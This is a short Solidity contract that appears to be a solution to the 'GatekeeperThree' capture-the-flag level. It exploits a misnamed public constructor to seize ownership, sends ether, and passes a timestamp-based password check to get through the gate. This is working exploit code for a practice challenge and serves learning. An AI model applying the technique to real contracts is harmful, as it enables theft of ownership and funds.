// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {GatekeeperThree} from "../instances/Ilevel28.sol";

contract GateCrasher {
    GatekeeperThree public immutable gate;

    constructor(address _gate) payable {
        gate = GatekeeperThree(payable(_gate));

        (bool success,) = address(gate).call{value: 0.0011 ether}("");
        require(success, "Failed to send ether");

        gate.construct0r();
        gate.createTrick();
        gate.getAllowance(block.timestamp);
    }

    function enter() public {
        gate.enter();
    }
}
